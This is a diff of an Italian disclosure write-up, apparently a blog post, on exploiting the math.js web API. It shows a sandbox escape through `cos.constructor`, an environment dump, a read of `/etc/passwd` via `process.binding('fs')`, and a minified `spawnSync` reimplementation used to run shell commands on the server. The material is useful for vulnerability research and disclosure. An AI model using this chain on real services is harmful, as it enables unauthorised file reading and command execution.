@@ -7,24 +7,29 @@ Questo articolo spiega in breve come abbiamo trovato, exploitato e segnalato una
 Sperimentando con [un wrapper](https://github.com/LucentW/s-uzzbot/blob/master/plugins/calculator.lua) dell'API math.js (`http://api.mathjs.org/v1/?expr=expression-here`), abbiamo scoperto che **sembra eseguire del codice JavaScript**, anche se con alcune restrizioni:
 
 ```
-!calc cos
+> !calc cos
 Result: function
-!calc eval
+
+> !calc eval
 Result: function
-!calc eval("x => x")
+
+> !calc eval("x => x")
 Error: Value expected (char 3)
-!calc eval("console.log")
+
+> !calc eval("console.log")
 Error: Undefined symbol console
-!calc eval("return 1")
+
+> !calc eval("return 1")
 Result: 1
 ```
 
 In particolare, sembra che `eval` sia stato sostituito con una versione sicura. Neanche `Function` e `setTimeout` funzionano:
 
 ```
-!calc Function("return 1")
+> !calc Function("return 1")
 Error: Undefined symbol Function
-!calc setTimeout
+
+> !calc setTimeout
 Error: Undefined symbol Function
 ```
 
@@ -46,7 +51,7 @@ Nell'ambiente math.js, non possiamo accedere direttamente a queste funzioni, o p
 Sappiamo che in math.js `cos` è definito come una funzione, per cui l'abbiamo usata:
 
 ```
-!calc cos.constructor("return 1")()
+> !calc cos.constructor("return 1")()
 Result: 1
 ```
 
@@ -55,17 +60,35 @@ Funziona!
 Da qua avremmo potuto semplicemente usare `require` con dei moduli nativi e avere accesso al sistema operativo, giusto? Purtroppo no: nonostante il server dell'API math.js giri in un ambiente Node.js, per qualche motivo non possiamo usare `require`.
 
 ```
-!calc cos.constructor("return require")()
+> !calc cos.constructor("return require")()
 Error: require is not defined
 ```
 
 Tuttavia abbiamo potuto usare `process`, che ha [diverse funzionalità carine](https://nodejs.org/api/process.html):
 
 ```
-!calc cos.constructor("return process")()
+> !calc cos.constructor("return process")()
 Result: [object process]
-!calc cos.constructor("return process.env")()
-Result: {"WEB_MEMORY": "512", "MEMORY_AVAILABLE": "512", "NEW_RELIC_LOG": "stdout", "NEW_RELIC_LICENSE_KEY": "<censurato>", "DYNO": "web.1", "PAPERTRAIL_API_TOKEN": "<censurato>", "PATH": "/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin", "WEB_CONCURRENCY": "1", "PWD": "/app", "NODE_ENV": "production", "PS1": "\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]", "SHLVL": "1", "HOME": "/app", "PORT": "<censurato>", "NODE_HOME": "/app/.heroku/node", "_": "/app/.heroku/node/bin/node"}
+
+> !calc cos.constructor("return process.env")()
+Result: {
+  "WEB_MEMORY": "512",
+  "MEMORY_AVAILABLE": "512",
+  "NEW_RELIC_LOG": "stdout",
+  "NEW_RELIC_LICENSE_KEY": "<censurato>",
+  "DYNO": "web.1",
+  "PAPERTRAIL_API_TOKEN": "<censurato>",
+  "PATH": "/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin",
+  "WEB_CONCURRENCY": "1",
+  "PWD": "/app",
+  "NODE_ENV": "production",
+  "PS1": "\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]",
+  "SHLVL": "1",
+  "HOME": "/app",
+  "PORT": "<censurato>",
+  "NODE_HOME": "/app/.heroku/node",
+  "_": "/app/.heroku/node/bin/node"
+}
 ```
 
 Nonostante `process.env` contenga alcune informazioni interessanti, non possiamo usarlo per fare nulla di interessante: dobbiamo andare più in fondo e usare [`process.binding`](http://stackoverflow.com/q/24042861), che esponde dei binding Javascript all'OS. Nonostante non siano presenti nella documentazione ufficiale, si può determinare il loro funzionamento leggendo il codice sorgente di Node.js. Ad esempio, possiamo usare `process.binding("fs")` per leggere qualsiasi file sul disco (se abbiamo i permessi necessari):
@@ -73,8 +96,8 @@ Nonostante `process.env` contenga alcune informazioni interessanti, non possiamo
 >Per brevità, salteremo il wrapper `!calc cos.constructor("code")`, e presenteremo solo il codice JS.
 
 ```
-buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer
-Result: root:x:0:0:root:/root:/bin/bash
+> buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer
+root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
@@ -83,11 +106,34 @@ sys:x:3:3:sys:/dev:/bin/sh
 
 Abbiamo quasi finito: dobbiamo solo capire come aprire una shell ed eseguire un qualsiasi comando. Chi ha esperienza con Node.js sarà a conoscenza di [`child_process`](https://nodejs.org/api/child_process.html), che può essere usato per spawnare processi tramite `spawnSync`: dobbiamo solo re-implementare `child_process` usando i binding al SO (ricordiamo che non possiamo usare `require`).
 
-È più facile di quanto sembri: basta prendere [il codice sorgente di `child_process`](https://github.com/nodejs/node/blob/master/lib/child_process.js), rimuovere il codice che non ci serve (funzioni inutilizzate e gestione degli errori), minificarlo ed eseguirlo nell'API ([qua il codice](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822)). Una volta fatto questo, **possiamo spawnare un qualsiasi processo** ed eseguire comandi nella shell:
+È più facile di quanto sembri: basta prendere [il codice sorgente di `child_process`](https://github.com/nodejs/node/blob/master/lib/child_process.js), rimuovere il codice che non ci serve (funzioni inutilizzate e gestione degli errori), minificarlo ed eseguirlo nell'API.
+
+<script src="https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822.js"></script>
+<noscript>
+```
+// Source: https://github.com/nodejs/node/blob/master/lib/child_process.js
+
+// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
+spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}
+
+// Defines spawnSync, the function that will do the actual spawning
+spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
+```
+<small>Gist [qui](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822</small>
+</noscript>
+
+Una volta fatto questo, **possiamo spawnare un qualsiasi processo** ed eseguire comandi nella shell:
 
 ```
-return spawnSync('/usr/bin/whoami');
-Result: {"status": 0, "signal": null, "output": [null, u15104, ], "pid": 100, "stdout": u15104, "stderr": }
+> spawnSync('/usr/bin/whoami');
+{
+  "status": 0,
+  "signal": null,
+  "output": [null, u15104, ],
+  "pid": 100,
+  "stdout": u15104,
+  "stderr":
+}
 ```
 
 ## Fase tre: segnalazione
